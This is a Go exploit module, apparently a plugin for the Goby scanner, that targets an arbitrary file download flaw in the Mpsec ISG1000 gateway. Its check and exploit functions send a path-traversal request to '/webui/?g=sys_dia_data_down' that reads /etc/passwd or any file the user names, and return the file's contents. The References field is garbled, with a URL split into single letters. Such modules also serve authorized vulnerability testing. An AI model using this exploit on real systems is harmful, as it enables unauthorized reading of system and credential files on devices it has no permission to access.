package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "Mpsec ISG1000 File read",
  "Description": "There is an arbitrary file download vulnerability in Mpsec ISG1000 security gateway, through which attackers can obtain arbitrary files from the server",
  "Product": "Mpsec ISG1000",
  "Homepage": "https://www.maipu.com.cn",
  "DisclosureDate": "2021-06-04",
  "Author": "PeiQi",
  "GobyQuery": "app=\"MAiPU-Gateway\"",
  "Level": "2",
  "Impact": "<p>through which attackers can obtain arbitrary files from the server</p>",
  "Recommendation": "Filter parameters",
  "References": [
    "h",
    "t",
    "t",
    "p",
    ":",
    "/",
    "/",
    "f",
    "o",
    "f",
    "a",
    ".",
    "s",
    "o"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "File",
      "type": "input",
      "value": "/etc/passwd"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "File read"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "Mpsec ISG1000"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Disable": false,
  "Recommandation": "<p>undefined</p>"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/webui/?g=sys_dia_data_down&file_name=../etc/passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "root")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			file := ss.Params["File"].(string)
			uri := "/webui/?g=sys_dia_data_down&file_name=.." + file
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}